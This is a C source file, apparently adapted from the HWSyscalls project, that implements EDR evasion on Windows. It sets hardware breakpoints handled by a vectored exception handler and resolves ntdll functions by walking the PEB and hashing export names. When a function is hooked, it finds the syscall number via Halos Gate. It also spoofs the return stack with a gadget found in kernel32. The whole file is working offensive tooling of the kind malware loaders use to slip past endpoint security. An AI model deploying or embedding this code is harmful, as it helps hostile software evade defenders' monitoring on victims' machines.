// Credits: https://github.com/Dec0ne/HWSyscalls

#include "hw_syscalls.h"

#pragma region GlobalVariables

PVOID exceptionHandlerHandle;
HANDLE myThread;
HANDLE hNtdll;
UINT64 ntFunctionAddress;
UINT64 k32FunctionAddress;
UINT64 retGadgetAddress;
UINT64 stackArgs[STACK_ARGS_LENGTH];
UINT64 callRegGadgetAddress;
UINT64 callRegGadgetAddressRet;
char callRegGadgetValue;
UINT64 regBackup;

#pragma endregion

#pragma region BinaryPatternMatching
// @janoglezcampos, @idov31 - https://github.com/Idov31/Cronos/blob/master/src/Utils.c

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);

    if (!imageBase)
        return 0;

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
        return 0;

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

#pragma endregion

#pragma region PEBGetProcAddress

UINT64 GetModuleAddress(LPWSTR moduleName) {
    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET);
    LIST_ENTRY* ModuleList = NULL;

    if (!moduleName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
        pListEntry != &peb->Ldr->InMemoryOrderModuleList;
        pListEntry = pListEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName) {
    UINT64 functionAddress = 0;

    if (!moduleBase) {  // Ensure moduleBase is valid
        DebugPrint("[-] Invalid module base for function %s\n", functionName);
        return 0;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

    // Checking that the image is valid PE file.
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return functionAddress;
    }

    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

    if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return functionAddress;
    }

    // Iterating the export directory.
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);

    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
        if (_stricmp((char*)(moduleBase + names[j]), functionName) == 0) {
            functionAddress = moduleBase + addresses[ordinals[j]];
            break;
        }
    }

    return functionAddress;
}

UINT64 GetSymbolAddressByHash(UINT64 moduleBase, UINT32 functionHash) {
    UINT64 functionAddress = 0;

    if (!moduleBase) {  // Ensure moduleBase is valid
        DebugPrint("[-] Invalid module base for function %llu\n", functionHash);
        return 0;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

    // Checking that the image is valid PE file.
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return functionAddress;
    }

    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

    if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return functionAddress;
    }

    // Iterating the export directory.
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);

    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
        if (HASHA((char*)(moduleBase + names[j])) == functionHash) {
            functionAddress = moduleBase + addresses[ordinals[j]];
            break;
        }
    }

    return functionAddress;
}

#pragma endregion

#pragma region HalosGate

DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
    WORD syscallNumber = 0;

    for (WORD idx = 1; idx <= 500; idx++) {
        // check neighboring syscall down
        if (*((PBYTE)functionAddress + idx * DOWN) == 0x4c
            && *((PBYTE)functionAddress + 1 + idx * DOWN) == 0x8b
            && *((PBYTE)functionAddress + 2 + idx * DOWN) == 0xd1
            && *((PBYTE)functionAddress + 3 + idx * DOWN) == 0xb8
            && *((PBYTE)functionAddress + 6 + idx * DOWN) == 0x00
            && *((PBYTE)functionAddress + 7 + idx * DOWN) == 0x00) {
            BYTE high = *((PBYTE)functionAddress + 5 + idx * DOWN);
            BYTE low = *((PBYTE)functionAddress + 4 + idx * DOWN);

            syscallNumber = (high << 8) | low - idx;
            DebugPrint("[+] Found SSN: 0x%X\n", syscallNumber);
            break;
        }

        // check neighboring syscall up
        if (*((PBYTE)functionAddress + idx * UP) == 0x4c
            && *((PBYTE)functionAddress + 1 + idx * UP) == 0x8b
            && *((PBYTE)functionAddress + 2 + idx * UP) == 0xd1
            && *((PBYTE)functionAddress + 3 + idx * UP) == 0xb8
            && *((PBYTE)functionAddress + 6 + idx * UP) == 0x00
            && *((PBYTE)functionAddress + 7 + idx * UP) == 0x00) {
            BYTE high = *((PBYTE)functionAddress + 5 + idx * UP);
            BYTE low = *((PBYTE)functionAddress + 4 + idx * UP);

            syscallNumber = (high << 8) | low + idx;
            DebugPrint("[+] Found SSN: 0x%X\n", syscallNumber);
            break;
        }

    }

    if (syscallNumber == 0)
        DebugPrint("[-] Could not find SSN\n");

    return syscallNumber;
}

DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
    DWORD64 syscallReturnAddress = 0;

    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)functionAddress + idx) == 0x0f && *((PBYTE)functionAddress + idx + 1) == 0x05) {
            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + idx);
            DebugPrint("[+] Found \"syscall;ret;\" opcode address: 0x%I64X\n", syscallReturnAddress);
            break;
        }
    }

    if (syscallReturnAddress == 0)
        DebugPrint("[-] Could not find \"syscall;ret;\" opcode address\n");

    return syscallReturnAddress;
}

#pragma endregion

#pragma optimize("", off)
UINT64 PrepareSyscall(char* functionName) {
    return ntFunctionAddress;
}
UINT64 PrepareSyscallHash(UINT32 functionHash) {
    return ntFunctionAddress;
}
#pragma optimize("", on)

BOOL SetMainBreakpoint() {
	InstallHardwareBreakingPntHook((PUINT_VAR_T)&PrepareSyscall, Dr0, (PVOID)&HWSyscallExceptionHandler, ALL_THREADS);
	InstallHardwareBreakingPntHook((PUINT_VAR_T)&PrepareSyscallHash, Dr1, (PVOID)&HWSyscallExceptionHandler, ALL_THREADS);

    DebugPrint("[+] Main HWBPs set successfully\n");
    return TRUE;
}

LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&PrepareSyscall) {
            DebugPrint("\n===============HWSYSCALLS DEBUG===============");
            DebugPrint("\n[+] PrepareSyscall Breakpoint Hit (%#llx)!\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
            
            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function
            ntFunctionAddress = GetSymbolAddress((UINT64)hNtdll, (const char*)(ExceptionInfo->ContextRecord->Rcx));
            DebugPrint("[+] Found %s address: 0x%I64X\n", (const char*)(ExceptionInfo->ContextRecord->Rcx), ntFunctionAddress);
            
            // Move breakpoint to the NTAPI function;
            DebugPrint("[+] Moving breakpoint to %#llx\n", ntFunctionAddress);
            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&PrepareSyscallHash) {
            DebugPrint("\n===============HWSYSCALLS DEBUG (HASH MODE)===============");
            DebugPrint("\n[+] PrepareSyscall Breakpoint Hit (%#llx)!\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
            
            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function
            ntFunctionAddress = GetSymbolAddressByHash((UINT64)hNtdll, (UINT32)(ExceptionInfo->ContextRecord->Rcx));
            DebugPrint("[+] Found %d address: 0x%I64X\n", (const char*)(ExceptionInfo->ContextRecord->Rcx), ntFunctionAddress);
            
            // Move breakpoint to the NTAPI function;
            DebugPrint("[+] Moving breakpoint to %#llx\n", ntFunctionAddress);
            //ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
            ExceptionInfo->ContextRecord->Dr1 = ntFunctionAddress;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {
            DebugPrint("[+] NTAPI Function Breakpoint Hit (%#llx)!\n", (DWORD64)ExceptionInfo->ExceptionRecord->ExceptionAddress);
            
            // Create a new stack to spoof the kernel32 function address
            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
            // sub rsp, 70
            ExceptionInfo->ContextRecord->Rsp -= 0x70;
            // mov rsp, REG_GADGET_ADDRESS
            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;
            DebugPrint("[+] Created a new stack frame with RET_GADGET (%#llx) as the return address\n", retGadgetAddress);

            // Copy the stack arguments from the original stack
            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
            {
                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
            }
            DebugPrint("[+] Original stack arguments successfully copied over to the new stack\n");

            DWORD64 pFunctionAddress = ExceptionInfo->ContextRecord->Rip;

            char nonHookedSyscallBytes[] = { 0x4C,0x8B,0xD1,0xB8 };
            if (FindPattern(pFunctionAddress, 4, (PBYTE)nonHookedSyscallBytes, (PCHAR)"xxxx")) {
                DebugPrint("[+] Function is not hooked\n");
                DebugPrint("[+] Continuing with normal execution\n");
            }
            else {
                DebugPrint("[+] Function is HOOKED!\n");
                DebugPrint("[+] Looking for the SSN via Halos Gate\n");

                WORD syscallNumber = FindSyscallNumber(pFunctionAddress);

                if (syscallNumber == 0) {
                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                DWORD64 syscallReturnAddress = FindSyscallReturnAddress(pFunctionAddress, syscallNumber);

                if (syscallReturnAddress == 0) {
                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                // mov r10, rcx
                DebugPrint("[+] Moving RCX to R10 (mov r10, rcx)\n");
                ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
                //mov eax, SSN
                DebugPrint("[+] Moving SSN to RAX (mov rax, 0x%X)\n", syscallNumber);
                ExceptionInfo->ContextRecord->Rax = syscallNumber;
                //Set RIP to syscall;ret; opcode address
                DebugPrint("[+] Jumping to \"syscall;ret;\" opcode address: 0x%I64X\n", syscallReturnAddress);
                ExceptionInfo->ContextRecord->Rip = syscallReturnAddress;

            }

            // Move breakpoint back to PrepareSyscall to catch the next invoke
            DebugPrint("[+] Moving breakpoint back to PrepareSyscall to catch the next invoke\n");
            ExceptionInfo->ContextRecord->Dr0 = (UINT64)&PrepareSyscall;
            ExceptionInfo->ContextRecord->Dr1 = (UINT64)&PrepareSyscallHash;

            DebugPrint("==============================================\n\n");

        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL FindRetGadget() {
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    retGadgetAddress = FindInModule("KERNEL32.DLL", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        DebugPrint("[+] Found RET_GADGET in kernel32.dll: %#llx\n", retGadgetAddress);
        return TRUE;
    }
    else {
        retGadgetAddress = FindInModule("kernelbase.dll", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
        DebugPrint("[+] Found RET_GADGET in kernelbase.dll: %#llx\n", retGadgetAddress);
        if (retGadgetAddress != 0) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL InitHWSyscalls() {
    myThread = GetCurrentThread();
    hNtdll = (HANDLE)GetModuleAddress((LPWSTR)L"ntdll.dll");

    if (!FindRetGadget()) {
        DebugPrint("[!] Could not find a suitable \"ADD RSP,68;RET\" gadget in kernel32 or kernelbase. InitHWSyscalls failed.");
        return FALSE;
    }

    if (!InitHardwareBreakpointHooking())
        return FALSE;

    // Register exception handler
    exceptionHandlerHandle = AddVectoredExceptionHandler(1, &HWSyscallExceptionHandler);

    if (!exceptionHandlerHandle) {
        DebugPrint("[!] Could not register VEH: 0x%X\n", GetLastError());
        return FALSE;
    }

    return SetMainBreakpoint();
}

BOOL DeinitHWSyscalls() {
    return RemoveVectoredExceptionHandler(exceptionHandlerHandle) != 0;
}